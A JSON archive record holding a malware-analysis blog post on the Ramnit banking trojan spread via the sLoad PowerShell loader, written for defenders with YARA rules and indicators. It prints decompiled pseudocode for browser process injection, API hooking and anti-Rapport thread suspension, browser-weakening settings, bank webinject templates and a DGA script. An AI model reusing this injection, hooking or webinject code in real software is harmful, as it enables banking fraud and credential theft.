{
    "id": "a7030160-ea1c-47dc-b42c-aa202e4df21c",
    "created_at": "2023-01-12T15:08:38.843738Z",
    "updated_at": "2025-03-27T02:05:51.111614Z",
    "deleted_at": null,
    "sha1_hash": "86a44c2adf678d33eccacdceeda5ff0641bcc942",
    "title": "2018-08-05 - Let's Learn- Diving into the Latest -Ramnit- Banker Malware via -sLoad- PowerShell",
    "authors": "",
    "file_creation_date": "2022-05-28T04:12:44Z",
    "file_modification_date": "2022-05-28T04:12:44Z",
    "file_size": 520627,
    "plain_text": "# Let's Learn: Diving into the Latest \"Ramnit\" Banker Malware via \"sLoad\" PowerShell\n\n**[vkremez.com/2018/08/lets-learn-in-depth-into-latest-ramnit.html](https://www.vkremez.com/2018/08/lets-learn-in-depth-into-latest-ramnit.html)**\n\n## Goal: In-depth reverse engineering of the latest Ramnit banker from \"sLoad\" PowerShell malware. The focus of the analysis is on the Ramnit banker core functionality, its hooking engine, webinjects, process injection, and main configuration.\n\n @James_inthe_box @VK_Intel @malwrhunterteam @devnullek https://t.co/GTtUWWCNrc\n from certutil -decode s://lapweol[.me/sload/camfaq/faq.txt — JAMESWT (@JAMESWT_MHT) July 23, 2018\n\n Malware:\n Original Loader (436aaa1014e8528ed72c89c4bf74d14c)\n rmnsoft.dll (304772c80b157a916c7041f2f15939fb)\n hooker2 (625db8cd9536c91f5ee044c318a80fec)\n -> x86 injected bot (73c95a2a9c9348f0b65de23a17f1790c)\n -> x64 injected bot (f836f4949483071d80b59d47d8ce2bd9)\n\n Background:\n For while, I have been observing an interesting combination of sLoad PowerShell loader and the Ramnit banker malware targeting customers of Italian and United Kingdom financial institutions. In one of the most recent campaigns, Ramnit was distributed via sload. The chain is very interesting on its own and includes including PowerShell loader with slightly modified PowerShell empire \"invoke-ReflectivePEInjection,\" certutil, and wscript execution. The malware chain is available to review at Any App Run.\n Ramnit is one of the oldest bankers on the financial cybercrime ecosystem dating back to 2010. Originally, started as a worm spreader, the malware acquired the banker capabilities after its developers adopted the leaked Zeus source code 2.0.8.9 converting it into a full- fledged banking Trojan.\n Ramnit banker somehow survived the Europol takedown in 2015 and remained active since 2016. It is notable, however, with the disappearance of the Ramnit version known as \"demetra,\" which was distributed via Rig Exploit Kit and \"Seamless\" gate.\n The latest campaigns leverage a Ramnit version adding LUA webinject-style as well relying on screenshot capturing functionality for account takeover fraud (ATO).\n Outline:\n\n\n-----\n\n```\nI. Ramnit Main DLL rmnsoft.dll \nA. Main Bot Configuration\nB. Ramnit Domain Generation Algorithm (DGA)\nII. Ramnit Webinject DLL \"hooker2.dll\" \nA. Browser Setting \"Relax\" and Inject Setup\nB. Process Injection: Resource \"BIN\" x86 or x64\nIII. x86/x64 Injected Bot\nA. Ramnit Hooking Engine\nB. Ramnit Anti-Rapport\nC. LUA Webinject Structure\nV. Yara Signatures\nA. Yara: Ramnit Main DLL \"rmnsoft.dll\"\nB. Yara: Ramnit Webinject DLL \"hooker2.dll\" (With Resource x86 and x64 Bot) \nVI. Appendix\nA. Ramnit Hooked API\nB. LUA Webinject\nC. Ramnit DGA Code (Pseudo) in Python\n\n## Analysis: I. Ramnit Main DLL \"rmnsoft.dll\" The main module of the Ramnit banker is called internally \"rmnsoft.dll.\" This module is responsible for execution of various commands and essentially remained unchanged for the past 6 years. It is well-documented by various researchers. The module also used for central communication between other modules and Ramnit core thread execution. The module contains the following exports:\n _CryptoCheckSignMessage@24 Start Stop\n\n Command Name Type Description\n\n```\n\n-----\n\n## getexec command_type=1 Download, save, and launch an executable file from a URL given by the Ramnit Command-and-Control (C2) infrastructure.\n\n kos command_type=2 Kill operating system or shut down the system via ntdll.dll:NtShutdownSystem and ExitWindowsEx\n\n screen command_type=3 Take screenshots and save it locally via Gdiplus.dll and GdipSaveImageToStream\n\n update command_type=4 Download the latest Ramnit malware from the C2\n\n cookies command_type=5 Retrieve local cookies from Windows Internet Explorer, Firefox, Opera, Safari, Chrome, Flash SOL\n\n removecookies command_type=6 Delete cookies from the system in order to force the victim to log in again and collect the data\n\n A. Main Bot Configuration Following reported CERT.PL Ramnit structure outlined in the blog, this specific Ramnit has the main configuration as follows:\n\n Config Value\n\n botnet_name '23.04_443'\n\n rc4_key 'fB1oN5frGqf'\n\n md5_magic 'fE4hNy1O'\n\n dga_seed '2538799770'\n\n dga_no '100'\n\n port '443'\n\n hardcoded_domain 'heoxhliqbug[.]eu'\n\n dga_tlds '.eu'\n\n The malware communicates to the command and control server leveraging the hardcoded MD5: 'f054bbd2f5ebab9cb5571000b2c50c02' for data structucture as part of the check-in.  B. Ramnit Domain Generation Algorithm (DGA) All the DGA structs are present in the beginning .data section as reported. The domain generation algorithm involves only one \".eu\" top level domain (TLD) with the unchanged rest of the other logic as reported by CERT.PL. Ramnit leverages linear congruential generator (LCG) for pseudo-random generation (thanks to @nazywam for the previous coverage!). The pseudo-coded C++ DGAdomain function is as follows:\n\n\n-----\n\n```\nint __stdcall dga_add_domain_eu(int dga_seed, LPSTR lpString1)\n{\n LCG_DGA(dga_seed, 12u);\n v6 = v2;\n v3 = lpString1;\n do\n  *v3++ = LCG_DGA(v2, 25u) + 'a';\n while ( v4 != 1 );\n *v3 = 0;\n lstrcatA(lpString1, a_eu);          // \".eu\"\n return (v6 * (unsigned __int64)(unsigned int)dga_seed >> 0x20) + v6 * dga_seed;\n}\n\n## The \"rmnsoft.dll\" also reaches out to the following domains to check connectivity: -> 'websearch[.]com:80' -> 'info[.]com:80' -> 'baidu[.]com:80' II. Ramnit Webinject DLL \"hooker2.dll\" The main module responsible for process injection and hooking of various browser APIs is called internally “hooker2.dll.” The exports are as follows:\n\n Ordinal Export\n\n 00000001 CommandRoutine\n\n 00000002 ModuleCode\n\n 00000003 StartRoutine\n\n 00000004 StopRoutine\n\n It is notable, however, that the unpacked version contains two resources with the original language artifacts set up to “Russian.\"\n\n Resource Type Name Signature Bit Language\n\n BIN 102 Executable (cpu: 32-bit) Russian\n\n BIN 103 Executable (cpu: 64-bit) Russian\n\n Primarily, this module is responsible for editing and disabling protected browser settings and injecting a 32-bit or 64-bit payload into the browser.\n\n```\n\n-----\n\n## A. Browser Setting Relax and Inject Setup The process injection functions targets four browsers from Microsoft Edge to Google Chrome.\n\n The pseudocoded C++ function is as follows:\n\n\n-----\n\n```\n////////////////////////////////////////////////////////////////////\n//////////////////// Ramnit Main Browser Setup and Injection ///////\n////////////////////////////////////////////////////////////////////\nchar __thiscall process_injection_main(char *this, int a2)\n{\n v3 = 0;\n v4 = this;\n dwProcessId = 0;\n func6(&StartupInfo.lpReserved, 0, 64);\n StartupInfo.cb = 68;\n ProcessInformation = 0i64;\n func6(&pszPath, 0, 260);\n v5 = GetShellWindow();\n GetWindowThreadProcessId(v5, &dwProcessId);\n v6 = func_str_iter((int **)v4, (char *)(a2 + 36));\n if ( !v6 )\n  return v3;\n if ( v6 == 2 )\n {\n  if ( MicrosoftEdge_processfinder(v2) )\n  {\n   SHGetSpecialFolderPathA(0, &pszPath, 38, 0);\n   lstrcatA(&pszPath, \"\\\\Internet Explorer\\\\iexplore.exe\");\n   // Create process with CREATE_SUSPENDED flag\nif ( CreateProcessA(0, &pszPath, 0, 0, 0, 0x4000000u, 0, 0, &StartupInfo,\n&ProcessInformation) )\n   {\n    v8 = ProcessInformation.dwProcessId;\n    *(_DWORD *)(a2 + 8) = ProcessInformation.dwProcessId;\n    if ( write_process_inj(v8, 0xF36BAC23, 0) )\n    {\n     v3 = 1;\n     Sleep(2000u);\nLABEL_22:\n     set_thread_exec(v7, *(_DWORD *)(a2 + 8));\n     return v3;\n    }\n   }\n  }\n  return v3;\n }\n if ( v6 == 4 )\n  return v3;\n if ( v6 == 1 )\n {\nLABEL_21:\n  v3 = 1;\n  goto LABEL_22;\n }\n if ( v6 != 5 )\n {\n  if ( v6 != 3 || dwProcessId != *(_DWORD *)(a2 + 24) )\n   return v3;\n\n```\n\n-----\n\n```\n  if ( mozilla_profile_writer() )\n  {\n   reg_query_main(\n    v10,\n    \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\App Paths\\\\firefox.exe\",\n    (unsigned int)&pszPath);\n   func4(*(_DWORD *)(a2 + 8), v4 + 8);\n   // Create process with CREATE_SUSPENDED flag\nif ( CreateProcessA(0, &pszPath, 0, 0, 0, 0x4000000u, 0, 0, &StartupInfo,\n&ProcessInformation) )\n   {\n    v11 = ProcessInformation.dwProcessId;\n    *(_DWORD *)(a2 + 8) = ProcessInformation.dwProcessId;\n    write_process_inj(v11, 0xF36BAC23, 0);\n   }\n  }\n  get_str_func(*(_DWORD *)(a2 + 8), (int)\"LdrLoadDll\", v10, 0xBB49);\n  get_str_func(*(_DWORD *)(a2 + 8), (int)\"BaseThreadInitThunk\", v12, 0xBB49);\n  goto LABEL_21;\n }\n if ( dwProcessId == *(_DWORD *)(a2 + 24) )\n {\n  reg_query_main(v7, \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\App\nPaths\\\\chrome.exe\", (unsigned int)&pszPath);\n  if ( !set_chrome_pref(v2)\n   || (func4(*(_DWORD *)(a2 + 8), v4 + 8),\n     lstrcatA(&pszPath, \" --disable-http2 --disable-quic --disk-cache-size=1\"),\n     Sleep(1000u),\n     // Create process with CREATE_SUSPENDED flag\nCreateProcessA(0, &pszPath, 0, 0, 0, 0x4000000u, 0, 0, &StartupInfo,\n&ProcessInformation))\n   && (*(_DWORD *)(a2 + 8) = ProcessInformation.dwProcessId,\n     Sleep(1000u),\n     write_process_inj(*(_DWORD *)(a2 + 8), 0xF36BAC23,\nProcessInformation.hProcess)) )\n  {\n   v3 = 1;\n   ZwMapViewOfSection_func(v9, *(_DWORD *)(a2 + 8));\n   goto LABEL_22;\n  }\n }\n return v3;\n}\n\n## Ramnit sets up the following preferences that are meant to \"relax\" Mozilla browser security and write changes to .ini and user[.]js preferences files locally.\n\"pref(\\\"privacy.trackingprotection.pbmode.enabled\\\", false);\"\n\"pref(\\\"browser.cache.disk.enable\\\", false);\"\n\"pref(\\\"browser.cache.disk.smart_size.enabled\\\", false);\"\n\"pref(\\\"browser.cache.disk.capacity\\\", 0);\");\n\"pref(\\\"network.http.spdy.enabled.http2\\\", false);\"\n\n```\n\n-----\n\n## In addition, the malware attempts to relax Google Chrome via \"--disable-http2 --disable-quic --disk-cache-size=1\" setup. B. Process Injection: Resource \"BIN\" x86 or x64 The process injection works as follows leveraging usual WriteProcessMemory API after obtaining access to the resource section and pulling the appropriate binary (either a 32-bit or 64-bit one) and injecting into the browser of choice.\n\n The pseudo-coded C++ function is as follows searching the loaded resource for \"0x5A4D\" and \"0x4550,\" \"MZ\" and \"NT\" headers, respectively to load the actual binary:\n\n\n-----\n\n```\n////////////////////////////////////////////////////////////////////\n//////////////////// Ramnit Simplified Process Injection ///////////\n////////////////////////////////////////////////////////////////////\nchar __stdcall write_process_inj(DWORD dwProcessId, int a2, HANDLE hProcess)\n{\n v3 = hProcess;\n v4 = 0;\n flOldProtect = 0;\n _mm_storel_pd((double *)lpBaseAddress, 0i64);\n NumberOfBytesRead = 0;\n v5 = 0x7D0;\n if ( v3 || (v3 = OpenProcess(0x1FFFFFu, 0, dwProcessId)) != 0 )\n {\n  if ( check_if_x64(0, v3) || !(dword_10064B98 & 1) )\n  {\n   GlobalFree_0(lpBaseAddress);\n   if ( !*(_QWORD *)lpBaseAddress )\n    goto LABEL_29;\n   ReadProcessMemory(v3, lpBaseAddress[0], &Buffer, 0x40u, &NumberOfBytesRead);\n   if ( !NumberOfBytesRead )\n    goto LABEL_29;\n   if ( Buffer != 23117 )\n    goto LABEL_29;\n   v9 = (char *)lpBaseAddress[0] + v21;\n   ReadProcessMemory(v3, (char *)lpBaseAddress[0] + v21, &v18, 0xF8u,\n&NumberOfBytesRead);\n   if ( !NumberOfBytesRead )\n    goto LABEL_29;\n   if ( v18 != 17744 )\n    goto LABEL_29;\n   if ( v19 == a2 )\n    goto LABEL_29;\n   dwProcessIdb = v9 + 8;\n   if ( !VirtualProtectEx(v3, v9 + 8, 4u, 4u, &flOldProtect) )\n    goto LABEL_29;\n   WriteProcessMemory(v3, dwProcessIdb, &a2, 4u, &NumberOfBytesRead);\n   VirtualProtectEx(v3, dwProcessIdb, 4u, flOldProtect, &NumberOfBytesRead);\n  }\n  else\n  {\n   GlobalFree_0(lpBaseAddress);\n   v6 = lpBaseAddress[0];\n   v7 = lpBaseAddress[1];\n   if ( !*(_QWORD *)lpBaseAddress )\n   {\n    do\n    {\n     if ( !v5 )\n      break;\n     Sleep(100u);\n     v11 = 0;\n     v5 -= 0x64;\n     GlobalFree_0(lpBaseAddress);\n     v6 = lpBaseAddress[0];\n     v7 = lpBaseAddress[1];\n\n```\n\n-----\n\n```\n    }\n    while ( !*(_QWORD *)lpBaseAddress );\n    if ( !__PAIR__((unsigned int)v6, (unsigned int)v7) )\n     goto LABEL_29;\n   }\n   if ( !ReadProcessMemory_0((HANDLE)v6, v7, (LPVOID)0x40,\n(DWORD)&NumberOfBytesRead, v11) )\n    goto LABEL_29;\n   if ( !NumberOfBytesRead )\n    goto LABEL_29;\n   if ( Buffer != 0x5A4D )        // Check for \"MZ\" header \"0x5A4D\"\n    goto LABEL_29;\n   v8 = *(_QWORD *)lpBaseAddress + v21;\n   hProcess = (HANDLE)((unsigned __int64)(*(_QWORD *)lpBaseAddress + v21) >> 32);\n   if ( !ReadProcessMemory_0(\n       (char *)lpBaseAddress[0] + v21,\n       (LPCVOID)HIDWORD(v8),\n       (LPVOID)0x108,\n       (DWORD)&NumberOfBytesRead,\n       v12) )\n    goto LABEL_29;\n   if ( !NumberOfBytesRead )\n    goto LABEL_29;\n   if ( v13 != 0x4550 )         // Check NT header signature \"0x4550\"\n    goto LABEL_29;\n   if ( v14 == a2 )\n    goto LABEL_29;\n   dwProcessIda = (void *)(v8 + 8);\n   hProcess = (char *)hProcess + __CFADD__((_DWORD)v8, 8);\n   if ( !VirtualProtectEx_0((HANDLE)(v8 + 8), hProcess, 4u, (DWORD)&flOldProtect,\nv15)\n    || !WriteProcessMemory_0(dwProcessIda, hProcess, (LPVOID)4,\n(DWORD)&NumberOfBytesRead, v16)\n    || !VirtualProtectEx_0(dwProcessIda, hProcess, flOldProtect,\n(DWORD)&NumberOfBytesRead, v17) )\n   {\n    goto LABEL_29;\n   }\n  }\n  v4 = 1;\nLABEL_29:\n  CloseHandle(v3);\n }\n return v4;\n}\n\n## In addition to the usual ntdll.dll:LdrLoadDll and user32:TranslateMessage hooks, Ramnit hooks the various browser API (see Appendix), including Google Chrome, which was one of the non-exported API hooks from \"chrome.dll\" that was hooked differently by the malware developers. More specifically, Ramnit searches \".text\" section of the Chrome dll. In memory, the malware checks for various SSL read and write functions. The main banker hooking function is as follows:\n\n```\n\n-----\n\n```\n///////////////////////////////////////////////////////////////////\n/////////////// Ramnit Main Web Hooker Serve Function ///////////// \n///////////////////////////////////////////////////////////////////\nHLOCAL Main_Browser_Hooker_func()\n{\n GetModule(InternetExplorer_function_array, \"wininet.dll\");\n GetModule(Mozilla_Firefox_function_array, \"nss3.dll\");\n Google_Chrome_Hook();\n Internet_Explorer_Hook();\n return FireFox_Hook();\n}\n\n## III. x86/x64 Injected Bot Finally, Ramnit injects an either 32-bit (x86) or 64-bit (x64) executable into the webbrowser process. A. Ramnit Hooking Engine Essentially, Ramnit hooking engine works to set up hooks for API calls of interest.Additionally, it has a routine to deal with non-exported API hooks for \"chrome.dll.\"\nCreateHook_API(const CHAR DLL_name, int original_function_name,\\\n int myHook_function, int address_of_original_function)\n\n By and large, Ramnit banker hooking engine works via overwriting the basic API with the redirect functions with the \"0xe9\" opcode for a jump with 32-bit relative offset with trampoline function and the write hook call with VirtualProtectEx API to make sure the function has 0x40 (PAGE_EXECUTE_READWRITE) property. Additionally, it attempts to conceal detection of this hooking technique via prepending NOP and/or RETN.\n\n```\n\n-----\n\n```\n////////////////////////////////////////////////////////////////////\n/////////////// Ramnit Hook Install Function ///////////////////////\n///////////////////////////////////////////////////////////////////\nsigned int __thiscall Hook_Function_Ramnit(char *func_name, int myHook_function, int\n*function_address)\n{\n char *original_function; \n char *current_func_id_thread;\n int v5;\n char jump_len;\n signed int result;\n SIZE_T v8;\n void *trampoline_lpvoid;\n int v10;\n int v11;\n unsigned __int8 jmp_32_bit_relative_offset_opcode;\n int relative_offset;\n DWORD flOldProtect;\n original_function = func_name;\n current_func_id_thread = func_name + 0x24;\n iter_func(func_name + 0x24, 0x90, 0x23);\n if ( function_address )            // Attempts to prepend \"0x90\" (nop)\nor \"0xC3\" (retn) to jump length to avoid basic hooking detect\n  jump_len = walker_byte_0(*(_BYTE **)(original_function + 1),\n(int)current_func_id_thread, v5);\n else\n  jump_len = 5;                // jump_length_trampoline -> 5\n original_function[5] = jump_len;\n if ( !jump_len )\n  goto LABEL_12;               // Setting up the trampoline buffer\n write_hook_iter((int)(original_function + 6), *(_BYTE **)(original_function + 1),\n(unsigned __int8)jump_len);\n if ( function_address )\n  *function_address = (int)current_func_id_thread;\n relative_offset = myHook_function - *(_DWORD *)(original_function + 1) - 5;\n v8 = (unsigned __int8)original_function[5];\n trampoline_lpvoid = *(void **)(original_function + 1);\n jmp_32_bit_relative_offset_opcode = 0xE9u;  // \"0xE9\" -> opcode for a jump with a\n32bit relative offset\n if ( VirtualProtectEx((HANDLE)0xFFFFFFFF, trampoline_lpvoid, v8, 0x40u,\n&flOldProtect) )// Set up the function for \"PAGE_EXECUTE_READWRITE\" w/\nVirtualProtectEx\n {\n  v10 = *(_DWORD *)(original_function + 1);\n  v11 = (unsigned __int8)original_function[5] - (_DWORD)original_function - 0x47;\n  original_function[66] = 0xE9u;\n  *(_DWORD *)(original_function + 0x43) = v10 + v11;\n  write_hook_iter(v10, &jmp_32_bit_relative_offset_opcode, 5);// -> Manually write\nthe hook \n  VirtualProtectEx(              // Return to original protect state\n   (HANDLE)0xFFFFFFFF,\n   *(LPVOID *)(original_function + 1),\n   (unsigned __int8)original_function[5],\n   flOldProtect,\n\n```\n\n-----\n\n```\n   &flOldProtect);\n  result = 1;\n }\n else\n {\nLABEL_12:\n  result = 0;\n }\n return result;\n}\n\n## When the Ramnit banker hooks the function, it enters the new hooked one and grabs various variables while passing control to the original one when the hooked function concludes.\n\n B. Ramnit Anti-Rapport The malware also implements functionality that is meant to walk the stack and suspend threads related to \"RapportGP.dl\" DLL. The malware leverages \"DbgHelp.dll\" library and\n\n```\n\n-----\n\n## relevant API calls such as StackWalk64, SymGetModuleBase64, and SymFunctionTableAccess64.\n\n\n-----\n\n```\n////////////////////////////////////////////////////////////////////\n///////////// Ramnit Anti-Rapport SuspendThread Function ///////////\n////////////////////////////////////////////////////////////////////\nchar anti_rapport()\n{\n qmemcpy(&storage_allocated, &loc_100FCD4C, 0x19u);\n return_handle_to_rapport_gp = GetModuleHandleA(\"RapportGP.dll\");\n if ( return_handle_to_rapport_gp\n  && ((ret_handle = GetModuleHandleA(\"DbgHelp.dll\")) != 0 \n|| (ret_handle = LoadLibraryA(\"DbgHelp.dll\")) != 0)\n  && (StackWalk64 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD,\n_DWORD, _DWORD, _DWORD, _DWORD))\nGetProcAddress(ret_handle, \"StackWalk64\"),\n    SymGetModuleBase64 = GetProcAddress(ret_handle, \"SymGetModuleBase64\"),\n    SymFunctionTableAccess64 = GetProcAddress(ret_handle,\n\"SymFunctionTableAccess64\"),\n    StackWalk64) )\n {\n  get_to_rapp = (int)return_handle_to_rapport_gp + *((_DWORD\n*)return_handle_to_rapport_gp + 0xF);\n  if ( *(_DWORD *)get_to_rapp == 0x4550 )   // PE = 0x4550 - Win32/NT signature.\n  {\n   v11 = 0;\n   if ( *(_WORD *)(get_to_rapp + 6) > 0u )\n   {\n    rapp_text = get_to_rapp + 0xF8;\n    while ( lstrcmpA((LPCSTR)rapp_text, \".text\") )\n    {\n     rapp_text += 0x28;\n     if ( ++v11 >= *(_WORD *)(get_to_rapp + 6) )\n      goto LABEL_20;\n    }\n    ....\n     do\n     {\n      thread_walker_suspender(Rapport_text_Ldr, rapport_text);\n////////////////////////////////////////////////////////////////////\n////////////// Ramnit Thread Suspender StackWalk Simplified ////////\n////////////////////////////////////////////////////////////////////\nopenthread_handle = OpenThread(0x1FFFFFu, 0, te.th32ThreadID);\n    if ( openthread_handle )\n    {\n     mm_shuffle_epi32_func(&Context.Dr0, 0, 0x2C8);\n     Context.ContextFlags = 0x1003F;\n     if ( GetThreadContext(openthread_handle, &Context) )\n     {\n      mm_shuffle_epi32_func(&v16, 0, 256);\n      rapport_ldr_location_3 = rapport_ldr_location_2;\n      Context_Eip[0] = Context.Eip;\n      Context_Ebp = Context.Ebp;\n      Context_Eip[1] = 0;\n      v17 = 3;\n      v19 = 0;\n      v20 = 3;\n      context_Esp = Context.Esp;\n\n```\n\n-----\n\n```\n      v22 0;\n      v23 = 3;\n      do\n      {\n       if ( StackWalk64 )\n       {\n        SymGetModuleBase64_func = SymGetModuleBase64;\n        SymFunctionTableAccess64_func = SymFunctionTableAccess64;\n        getcurrentproc_handle = GetCurrentProcess();\n        if ( !StackWalk64(\n            0x14C,\n            getcurrentproc_handle,\n            openthread_handle,\n            Context_Eip,\n            &Context,\n            0,\n            SymFunctionTableAccess64_func,\n            SymGetModuleBase64_func,\n            0) )\n         break;\n        if ( !Context_Eip[1]\n         && Context_Eip[0] >= rapport_ldr_location_3\n         && *(_QWORD *)Context_Eip <= (unsigned\n__int64)len_location_rapport_1 )\n        {\n         SuspendThread(openthread_handle);\n        }\n       } \n\n## C. Ramnit LUA Webinject Structure The malware utilizes interesting LUA-coded webinjects with different setups with the developer comments including \"damn lua... in 5.3 bit are depricated or im govnocoder (sic!) (\"badcoder\" from Russian. -VK). Some of the core logic and setup are provided below. V. Yara Signatures A. Ramnit Main DLL \"rmnsoft.dll\"\n\n```\n\n-----\n\n```\nimport pe \nrule crime_win32_ramnit_rmnsoft_dll {\n  meta:\n   description = \"Detects latest Ramnit rmnsoft.dll from sLoad\"\n   author = \"@VK_Intel\"\n   date = \"2018-08-03\"\n   hash1 = \"7f054300fa64e7bcdec7f5538876e6008d6164f21ff21c6375e36dfe04a63412\"\n  strings:\n   $s1 = \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\App Paths\\\\Opera.exe\"\nfullword ascii\n   $s2 = \"%APPDATA%\\\\Apple Computer\\\\Safari\\\\Cookies\\\\Cookies.plist\" fullword\nascii\n   $s4 = \"rmnsoft.dll\" fullword ascii\n   $s5 = \"%APPDATA%\\\\Mozilla\\\\Firefox\\\\\" fullword ascii\n   $s6 = \"%APPDATA%\\\\Opera\\\\\" fullword ascii\n   $s7 = \"HTTPMozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\" fullword\nascii\n   $s8 = \"\\\"ntdll.dll\" fullword ascii\n   $s11 = \"multipart/*boundary={*}application/x-www-formurlencodedtext/plainname=\\\"{*}\\\"{*}https://http://\" fullword wide\n   $s12 = \"websearch.com:80\" fullword ascii\n   $s13 = \"User-Agent:{*}\" fullword wide\n   $s14 = \"complete.dat\" fullword ascii\n   $s15 = \"info.com:80\" fullword ascii\n   $s16 = \"baidu.com:80\" fullword ascii\n   $s17 = \"\\\\profile\\\\cookies4.dat\" fullword ascii\n   $s19 = \"C:\\\\WINDOWS\\\\Application Data\\\\Mozilla\\\\Firefox\\\\\" fullword ascii\n   $s20 = \"\\\\cookies.txt\" fullword ascii\n  condition:\n   ( uint16(0) == 0x5a4d and\n     filesize < 300KB and\n     pe.imphash() == \"291ff87948e45914424cec9510c297da\" and pe.exports(\"Start\") \n   and pe.exports(\"Stop\") and pe.exports(\"_CryptoCheckSignMessage@24\") and\n     ( 8 of them )\n   ) or ( all of them )\n}\n\n## B. Ramnit Webinject DLL \"hooker2.dll\" (With Resource x86 and x64 Bot)\n\n```\n\n-----\n\n```\nrule crime_win32_64_ramnit_hooker_dll_binary {\n  meta:\n   description = \"Detects Ramnit latest hooker2.dll with embedded two (x86/x64)\nresources. The detection is across all 3 components\"\n   author = \"@VK_Intel\"\n   date = \"2018-08-05\"\n   hash1 = \"d817fcf2a2e4a6e6e5b8f130d97a476b7e77697587dc5490a7241e571edd171e\"\n   hash2 = \"51ce5faa14ce6e496ccc0c71ff051740452e347bea0d343445c1993f36b79931\"\n   hash3 = \"23a2a8777b343d2fb68536387dda9e122c80d4a77c955bd1985b7f9239c09f7c\"\n  strings:\n   $s2 = \"RapportGP.dll\" fullword wide\n   $s5 = \"aswhook.dll\" fullword wide\n   $s6 = \"No row to get a column from. executeStep() was not called, or returned\nfalse.\" fullword ascii\n   $s7 = \"NtCreateEvent NtCreateMutant NtCreateSemaphore NtCreateUserProcess\nNtMapViewOfSection NtOpenEvent NtOpenMutant NtOpenSemaphore N\" ascii\n   $s8 = \"GetRemoteInject\" fullword ascii\n   $s9 = \"!\\\\?.dll;!\\\\..\\\\lib\\\\lua\\\\5.3\\\\?.dll;!\\\\loadall.dll;.\\\\?.dll\" fullword\nascii\n   $s10 = \"sub-select returns %d columns - expected %d\" fullword ascii\n   $s11 = \"SELECT sql FROM \\\"%w\\\".sqlite_master WHERE type='table'AND\nname<>'sqlite_sequence' AND coalesce(rootpage,1)>0\" fullword ascii\n   $s12 = \"0 && \\\"Attempting to pause parser in error state\\\"\" fullword wide\n   $s13 = \"User-Agent-Session: \" fullword wide\n   $s14 = \"invalid character in content-length header\" fullword ascii\n   $s15 = \"too many arguments on %s() - max %d\" fullword ascii\n   $s16 = \"--- REAL HEADERS ---\" fullword wide\n   $s17 = \"tQueryInformationProcess NtResumeThread NtWriteVirtualMemory\nZwCreateEvent ZwCreateMutant ZwCreateSemaphore ZwCreateUserProcess \" ascii\n   $s18 = \"unexpected content-length header\" fullword ascii\n  condition:\n   ( uint16(0) == 0x5a4d and\n    filesize < 9000KB and ( 8 of them )\n   ) or ( all of them )\n}\n\n## VI. Appendix: A. Ramnit Hooked API Internet Explorer:\nInternetReadFile\nHttpSendRequestExA\nHttpSendRequestExW\nHttpSendRequestA\nHttpSendRequestW\nInternetOpenUrlA\nInternetOpenUrlW\nInternetCloseHandle\nHttpOpenRequestA\nHttpOpenRequestW\nInternetWriteFile\nInternetQueryDataAvailable\nInternetReadFileExA\nInternetReadFileExW\n\n```\n\n-----\n\n## Mozilla Firefox:\n```\nPR_OpenTCPSocket\nPR_Close\nPR_Write\nPR_Read\nPR_GetError\nPR_GetNameForIdentity\n\n Google Chrome:\nSSL_read\nSSL_write\n\n user32.dll:\nTranslateMessage\n\n ntdll.dll:\nLdrLoadDll\n\n B. LUA Webinject 1. Webinject Setup Syntax\nbankLog = {\n url = \"%BANKURL%\",\n req_type = get_type + log_type,\n modification_arrays = {\n  [1] = {\n      data_before = [[<div class=\"inner\"><p><strong><p>]],\n      data_inject = [[]],\n      data_after = [[</p><p>We]]\n     }\n }\n};\n\n 2. Webinject POST\nbankPOST = {\n url = \"%BANKURL%\",\n req_type = post_type, -- Post only\n command = VAR,\n vars = {\n [\"tlda\"] = \"pnlSetupNewPayeePayaPerson%3AfrmPayaPersonArrangement%3AstrBen\\\n+\"AccountNumber\"\n }\n};\n\n 3. Webinject Variables\nget_type, post_type, log_type = 1, 2, 4;\nlocal log_type_bit_order = 3;\n\n```\n\n-----\n\n```\n  damn lua... in 5.3 bit are depricated or im govnocoder\nallow_report, not_allow_report, screen_report = 1, 0, 2;\nlocal content_types = { \"javascript\", \"text\", \"application\"};\n\n## 4. WebFilters\nlocal WebFilters = {\n -- Put filters for reports here\n --\"~*unicredit[.]it*\", -- Do not use screens on urls from here. Not tested\ncurrently\n --\"~*banking4you*\",\n \"*recruiter*\",\n \"*employer*\",\n \"*job*\",\n \"*facebook[.]com/login.php*\",\n \"*login.live[.]com*\",\n \"*twitter[.]com/login*\",\n \"*accounts.google[.]com*\",\n \"*mail[.]ru*\",\n \"!http://*\",\n \"!sessioncam[.]com*\",\n \"!netflix[.]com*\",\n \"!facebook[.]com*\",\n \"!google[.]com*\",\n \"!lampoilbro[.]eu\",\n \"!youtube[.]com\",\n \"!criteo[.]com\",\n \"!doubleclick[.]net\",\n \"!analytics[.]com\",\n \"!urs.microsoft[.]com\",\n \"!zynga[.]com\"\n};\n\n 5. ScreenshotsContainer\nlocal ScreenshotsContainer = {\n -- Put urls for screenshots here\n \"*mail[.]ru*\",\n \"*Redacted_UK_Financial_Institutions_URL*\",\n};\n\n C. Ramnit DGA pseudo-function Python function\n\n```\n\n-----\n\n```\n# https://www.cert.pl/en/news/single/ramnit in depth analysis/\nseed = '2538799770'\ntld = \".eu\"\ndef lcg(a1, a2):\n return 16807 * (a1 % 127773) - 2836 * (a1 / 127773) % a2\ndef dga(seed, tld):\n domain = \"\"\n new_seed = rng(seed, 12)\n seed_after_length = new_seed\n for i in range(domain_length):\n  c, new_seed = rng(new_seed, 25)\n  domain += chr(c + ord('a'))\n seed *= seed_after_length\n seed = ((seed >> 32) + (seed & 0xffffffff)) & 0xffffffff\n domain += tld\n return domain, seed\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2018/2018-08-05 - Let's Learn- Diving into the Latest -Ramnit- Banker Malware via -sLoad- PowerShell.pdf"
    ],
    "report_names": [
